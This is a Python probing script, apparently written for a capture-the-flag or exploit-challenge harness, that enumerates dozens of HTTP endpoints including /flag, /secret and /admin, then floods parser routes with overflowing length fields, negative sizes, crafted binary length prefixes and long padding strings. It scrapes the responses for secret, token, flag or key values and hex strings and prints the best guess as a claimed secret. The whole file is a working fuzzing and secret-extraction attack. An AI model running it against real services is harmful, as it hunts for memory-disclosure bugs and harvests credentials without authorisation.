import json,sys,base64,os,re

PROV=None
if len(sys.argv)>1:
    try: PROV=json.loads(sys.argv[1])
    except Exception: PROV={"raw":sys.argv[1][:4000]}

def req(method,path,body=None,body_hex=None,headers=None):
    m={"http":{"method":method,"path":path}}
    if body is not None: m["http"]["body"]=body
    if body_hex is not None: m["http"]["body_hex"]=body_hex
    if headers: m["http"]["headers"]=headers
    print(json.dumps(m),flush=True)
    line=sys.stdin.readline()
    if not line: return None
    try: return json.loads(line)
    except Exception: return {"status":-1,"body_b64":""}

entries=[]
def probe(method,path,tag,body=None,body_hex=None,headers=None):
    r=req(method,path,body,body_hex,headers)
    e={"tag":tag,"m":method,"p":path,"st":None,"ct":None,"blen":0,"body":""}
    if r:
        e["st"]=r.get("status"); e["ct"]=r.get("content_type")
        b=r.get("body_b64") or ""
        try: raw=base64.b64decode(b)
        except Exception: raw=b.encode('utf-8','replace')
        e["blen"]=len(raw)
        e["body"]=raw.decode('utf-8','replace')[:8000]
    entries.append(e)
    return e

PATHS=["/","/help","/help/","/readme","/README.md","/README","/usage","/format","/doc","/docs","/api","/api/","/spec","/openapi.json","/swagger.json","/schema","/health","/healthz","/status","/info","/version","/ping","/test","/echo","/index","/index.html","/index.txt","/parse","/parse/","/parser","/record","/records","/record/parse","/records/parse","/parse-record","/parse_record","/parseRecord","/upload","/ingest","/decode","/read","/readrecord","/api/parse","/api/record","/api/v1/parse","/v1/parse","/api/records/parse","/process","/handle","/data","/rpc","/query","/search","/find","/debug","/source","/flag","/secret","/admin","/metrics","/robots.txt","/favicon.ico","/submit","/recv","/receive","/packet","/msg","/message","/obj","/blob","/bin"]

for p in PATHS:
    probe("GET",p,"G "+p)
for p in PATHS:
    probe("POST",p,"P0 "+p,body="")

PAY=["/parse","/","/record","/records/parse","/upload","/decode","/read","/ingest","/api/parse","/process","/rpc","/data"]

jsons=['{"length":-1}','{"length":4294967295}','{"length":2147483647}','{"length":-2147483648}','{"length":9999999999}','{"length":1099511627775}','{"len":-1}','{"size":-1}','{"count":-1}','{"n":-1}','{"num":-1}','{"length":18446744073709551615}','{"type":1,"length":-1}','{"type":"A","len":4,"data":"AAAA"}','{"records":[{"len":-1,"data":"AAAA"}]}','{"data":"","length":0}']
for p in PAY:
    for j in jsons:
        probe("POST",p,"PJ "+p+" "+j,body=j,headers={"Content-Type":"application/json"})

def lenpref(n,size,little=False):
    if little: return n.to_bytes(size,'little')
    return n.to_bytes(size,'big')

bins=[]
for n in [0xFFFFFFFF,0x7FFFFFFF,0x80000000,0xFFFFFFF0,0xFFFFFFFE,0x100000000-1,0x00FFFFFF,0x0FFFFFFF,0x7FFFFE,0xFFFF]:
    for size in (2,4,8):
        if n < (1<<(8*size)):
            for little in (False,True):
                bins.append(lenpref(n,size,little)+b"AAAA")
for n in [0xFF,0x80,0x7F]:
    bins.append(bytes([n])+b"AAAA")
bins.append(b"AAAA"+lenpref(0xFFFFFFFF,4))
bins.append(b"AAAA"+lenpref(0xFFFFFFFF,4,True))
for p in PAY:
    for rb in bins:
        probe("POST",p,"PB "+p+" "+rb.hex(),body_hex=rb.hex())

txt=['len=-1','length=-1','LEN=-1','4:-1','-1\nAAAA','AAAA\n\xff\xff\xff\xff','{"len":4294967295}','\x01\x00\x00\x00\xff\xff\xff\xff']
for p in PAY:
    for t in txt:
        probe("POST",p,"PT "+p+" "+repr(t),body=t)

for p in PAY:
    for n in (256,4096,65536):
        probe("POST",p,"PA "+p+" A*%d"%n,body="A"*n)
    probe("POST",p,"PL "+p+" lines",body=("AAAA\n"*10000))

for q in ["/parse?len=4294967295","/parse?length=-1","/parse?count=-1","/record?len=999999999","/parse?n=-1","/upload?size=-1"]:
    probe("GET",q,"GQ "+q)

out={"prov":PROV,"n":len(entries),"entries":entries}
try:
    with open("/tmp/probe.json","w") as f: json.dump(out,f)
except Exception:
    pass

cands=[]
for e in entries:
    t=e.get("body") or ""
    for m in re.finditer(r'(?i)(secret|token|flag|key)[^\n]{0,120}', t):
        cands.append(("ctx",m.group(0)[:160]))
    for m in re.finditer(r'(?i)(?:secret|token|flag|key)\s*[:=]\s*["\']?([0-9a-fA-F]{8,128})', t):
        cands.append(("kv",m.group(1)))
    for m in re.finditer(r'\b([0-9a-fA-F]{16,128})\b', t):
        cands.append(("hex",m.group(1)))

pick=""
for kind,val in cands:
    if kind=="kv": pick=val; break
if not pick:
    for kind,val in cands:
        if kind=="ctx" and re.search(r'(?i)(secret|token|flag)[^0-9a-f]*[0-9a-f]{8,}', val):
            m=re.search(r'[0-9a-fA-F]{8,}', val)
            if m: pick=m.group(0); break
if not pick:
    for kind,val in cands:
        if kind=="hex": pick=val; break
if pick:
    if pick.lower().startswith('0x'): pick=pick[2:]
    if len(pick)%2: pick=pick[:-1]
else:
    pick=""
print("CANDS",len(cands),file=sys.stderr)
print('CLAIM:'+json.dumps({"secret_hex":pick}))